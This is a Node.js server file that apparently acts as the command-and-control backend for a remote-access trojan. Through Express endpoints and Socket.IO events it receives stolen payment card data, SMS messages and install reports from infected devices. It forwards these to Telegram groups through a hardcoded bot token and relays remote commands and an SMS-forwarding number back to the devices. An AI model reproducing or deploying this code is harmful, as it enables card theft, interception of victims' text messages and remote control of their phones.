// Importing necessary modules
const TelegramBot = require('node-telegram-bot-api');
const token = '8899265028:AAFhk8hBs4JcqM_DTBFkBRILug7TXFLg4o4';
const bot = new TelegramBot(token, { polling: false, request: {
    agentOptions: {
        keepAlive: true,
        family: 4
    }
}});
const groupIdCC = '-4221880281';
const groupIdSS = '-4285455874';
const groupIdINS = '-4287262264';

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

// Create the first Express app
const app = express();
const port = process.env.PORT || 3000;

const cors = require('cors');

app.use(cors()); // Allow all origins
app.use(express.json());

// Create an HTTP server
const server = http.createServer(app);

// Attach Socket.IO to the HTTP server
const io = socketIo(server);

const jsonData = {
  message: 'Done!',
};

app.get('/', (req, res) => {
  res.send(jsonData);
});

bot.onText(/\/id/, (msg) => {
  bot.sendMessage(msg.chat.id, `Chat ID: ${msg.chat.id}`);
});

app.post('/dataIO', (req, res) => {
  //console.log('DATA IO',req.body.data);
  const data_ = req.body.data;
  io.emit('user_online',data_);
  res.status(200).send(jsonData);
});

app.post('/dataAlert', (req, res) => {
  //console.log('DATA IO',req.body.data);
  const data_ = req.body.data;
  io.emit('user_online',data_);
  res.status(200).send(jsonData);
});

app.post('/dataI', (req, res) => {
  //console.log('DATA C',req.body.data);
  const data_ = req.body.data;
  io.emit('install_got',data_);
  bot.sendMessage(groupIdINS, data_).then(() => {})
  .catch((error) => {
      console.log("ERROR",error);
  });
  res.status(200).send(jsonData);
});

app.post('/dataC', (req, res) => {
  //console.log('DATA C',req.body.data);
  const data_ = req.body.data;
  io.emit('card_got',data_);
  bot.sendMessage(groupIdCC, data_).then(() => {})
  .catch((error) => {
      console.log("ERROR",error);
  });
  res.status(200).send(jsonData);
});

app.post('/dataS', (req, res) => {
	const data_ = req.body.data;
    //console.log('Received message:', data_);
	io.emit('sms_got',data_);
    bot.sendMessage(groupIdSS, data_).then(() => {})
    .catch((error) => {
      console.log("ERROR",error);
    });
	res.status(200).send(jsonData);
});

// Socket.IO event handlers
io.on('connection', (socket) => {
  console.log('WebSocket client connected');
  socket.on('message', (message) => {
    console.log('Received message:', message);
    socket.emit('msg', 'Hello from WebSocket server!');
  });
  	socket.on('card_send' , function(data){
		io.emit('card_got',data);
		bot.sendMessage(groupIdCC, data_).then(() => {})
		  .catch((error) => {
			  console.log("ERROR",error);
		  });
	});
	
	socket.on('card_copy_ss' , function(data){
		io.emit('card_copy_pc',data);
	});
	
	socket.on('send_card_copy' , function(data){
		io.emit('card_copy',data);
	});
	
	////////////////////////////////////////////////////////////
	
	socket.on('update_num_server' , function(data){
		console.log('UPDATING FORW_NUM: '+data);
		forw_num = data;
		io.emit('update_num',forw_num);
	});
	
	socket.on('online_check' , function(data){
		io.emit('is_online',data);
	});
	
	socket.on('online_check_card' , function(data){
		io.emit('are_you_online',data);
	});
	
	socket.on('user_send' , function(data){
		io.emit('user_online',data);
	});
		
	socket.on('msg_send' , function(data){
		io.emit('sms_got',data);
	});
	
	socket.on('net_send' , function(data){
		io.emit('net_got',data);
	});
	
	socket.on('cmd' , function(data){
		io.emit('cmd_send',data);
	});
	
	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
	socket.on('user_connected' , function(data){
		io.emit('on_user_connected',data);
	});
	
	socket.on('card_data' , function(data){
		io.emit('card_data_rat',data);
	});

	socket.on('sms' , function(data){
		io.emit('sms_rat',data);
	});
	
		
	socket.on('cmd_done' , function(data){
		io.emit('cmd_done_rat',data);
	});
	
	socket.on("disconnect", () => console.log("User Disconnected: "+socket.id));
	////////////////////////////////////////////////////////////
	
});

// Start the HTTP server
server.listen(port, () => {
  console.log(`Server running at ${port}`);
});





